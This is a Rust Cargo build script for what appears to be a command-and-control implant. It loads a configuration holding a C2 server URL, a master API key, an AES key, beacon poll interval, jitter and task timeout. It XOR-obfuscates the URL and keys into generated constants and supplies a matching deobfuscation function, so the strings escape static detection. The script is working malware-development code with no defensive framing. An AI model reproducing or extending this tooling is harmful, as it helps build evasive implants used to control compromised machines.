use std::{env, fs, path::Path};

fn main() {
    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
    let config_path = Path::new(&manifest_dir).join("..").join("config.json");
    let config: serde_json::Value = match fs::read_to_string(&config_path) {
        Ok(c) => serde_json::from_str(&c).unwrap(),
        Err(_) => {
            println!("cargo:warning=config.json not found at {:?}, using defaults", config_path);
            serde_json::json!({
                "c2_url": "https://127.0.0.1:8443",
                "api_key": "c2-master-key-2026",
                "aes_key_hex": "1234",
                "agent_poll_interval": 10,
                "jitter": 5,
                "task_timeout": 30,
            })
        }
    };

    let xor_key: u8 = 0xAA;

    fn obfuscate(s: &str, key: u8) -> String {
        s.bytes().map(|b| format!("0x{:02X}", b ^ key)).collect::<Vec<_>>().join(", ")
    }

    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("config_gen.rs");

    fs::write(
        dest,
        format!(
            r#"pub const XOR_KEY: u8 = 0xAA;

pub const C2_URL_BYTES: &[u8] = &[{}];
pub const API_KEY_BYTES: &[u8] = &[{}];
pub const AES_KEY_HEX_BYTES: &[u8] = &[{}];
pub const POLL_INTERVAL: u64 = {};
pub const JITTER: u64 = {};
pub const TASK_TIMEOUT_MS: u32 = {};

pub fn deobf(data: &[u8]) -> String {{
    data.iter().map(|&b| (b ^ XOR_KEY) as char).collect()
}}
"#,
            obfuscate(config["c2_url"].as_str().unwrap(), xor_key),
            obfuscate(config["api_key"].as_str().unwrap(), xor_key),
            obfuscate(config["aes_key_hex"].as_str().unwrap(), xor_key),
            config["agent_poll_interval"].as_u64().unwrap_or(10),
            config["jitter"].as_u64().unwrap_or(5),
            config["task_timeout"].as_u64().unwrap_or(30) as u32 * 1000,
        ),
    )
    .unwrap();

    println!("cargo:rerun-if-changed=../config.json");
}
